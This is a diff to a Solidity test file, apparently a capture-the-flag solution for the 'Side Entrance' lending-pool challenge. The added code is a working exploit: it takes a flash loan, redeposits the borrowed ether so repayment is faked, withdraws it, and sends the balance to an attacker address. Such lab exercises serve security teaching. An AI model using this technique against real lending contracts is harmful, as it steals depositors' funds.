@@ -32,10 +32,21 @@ contract SideEntrance is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    function execute() public payable {
+        sideEntranceLenderPool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {
+        (bool succeed,) = payable(address(attacker)).call{value: address(this).balance}("");
+        require(succeed, "transfer failed!");
+    }
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
+        sideEntranceLenderPool.withdraw();
 
         /**
          * EXPLOIT END *
